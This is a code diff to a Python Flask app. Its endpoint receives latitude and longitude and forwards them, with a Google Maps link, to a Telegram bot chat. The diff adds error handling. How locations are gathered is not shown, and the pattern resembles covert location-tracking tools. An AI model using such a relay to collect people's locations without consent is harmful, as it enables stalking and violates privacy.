@@ -19,11 +19,17 @@ def send_location():
     lon = data.get("longitude")
     if lat and lon:
         msg = f"📍 موقع جديد:\nخط العرض: {lat}\nخط الطول: {lon}\nhttps://www.google.com/maps?q={lat},{lon}"
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
-        return jsonify({"status": "ok"})
-    return jsonify({"status": "error"}), 400
+        try:
+            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                              data={"chat_id": CHAT_ID, "text": msg})
+            if r.status_code == 200:
+                return jsonify({"status":"ok"})
+            else:
+                return jsonify({"status":"fail"}), 500
+        except Exception as e:
+            return jsonify({"status":"error","error":str(e)}),500
+    return jsonify({"status":"invalid"}),400
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
+    port = int(os.environ.get("PORT",5000))
     app.run(host="0.0.0.0", port=port)
